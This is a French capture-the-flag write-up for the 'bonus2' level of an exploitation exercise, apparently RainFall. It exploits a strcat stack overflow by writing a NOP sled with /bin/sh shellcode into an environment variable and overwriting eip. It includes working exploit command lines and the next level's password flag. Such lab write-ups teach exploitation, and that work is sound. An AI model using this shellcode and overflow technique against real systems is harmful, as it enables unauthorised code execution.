On remarque encore des strncpy, le premier de 40 caractères et le second de 32 caractères.

```bash
...
(gdb) r $(python -c 'print "a" * 40') $(python -c 'print "A" * 33')
...
(gdb) cont
Continuing.
Hello aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��

Program received signal SIGSEGV, Segmentation fault.
0x08004141 in ?? ()
```

Nous remarquons que nous pouvons altérer la valeur de retour de la fonction `greetuser`, à l'aide de la fonction `strcat`.
Nous remarquons que le message est diffèrent selon la variable environement `LANG`. Ce qui modifie la taille de la string écrite.
On trouve le nombre de caractères avant de pouvoir modifier le registre `eip`.


On set une variable d'environement `S` où l'on insère des NOP suivis de notre shellcode.
Les NOP permettent de trouver plus facilement le shellcode.

```bash
bonus2@RainFall:~$ export S=$(python -c 'print "\x90" * 50 + "\x31\xC0\x31\xDB\x31\xD2\x31\xC9\xB0\x0B\x53\x68\x6E\x2F\x73\x68\x68\x2F\x2F\x62\x69\x89\xE3\xCD\x80"')
```

Ensuite on cherche où est à peu près l'adresse de `S` afin de pouvoir rediriger à cette endroit pour executer le shellcode.

```bash
bonus2@RainFall:~$ gdb bonus2
...
(gdb) unset env LINES
(gdb) unset env COLUMNS
(gdb) b main
Breakpoint 1 at 0x80485a7
(gdb) r
Starting program: /home/user/bonus2/bonus2 
(gdb) x/250s $esp
...
0xbffffe54:	"S=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300\061\333\061\322\061ɰ\vShn/shh//bi\211\343̀"
```

Voici deux exemples où l'on récupère le `.pass`:

```bash
bonus2@RainFall:~$ LANG=fi ./bonus2 $(python -c 'print "a" * 40') $(python -c 'print "A" * 18 + "\xaf\xfe\xff\xbf"')
Hyvää päivää aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaAAAAAAAAAAAAAAAAAA����
$ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```

```bash
bonus2@RainFall:~$ LANG=nl ./bonus2 $(python -c 'print "a" * 40') $(python -c 'print "A" * 23 + "\xaf\xfe\xff\xbf"')
Goedemiddag! aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaAAAAAAAAAAAAAAAAAAAAAAA����
$ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```
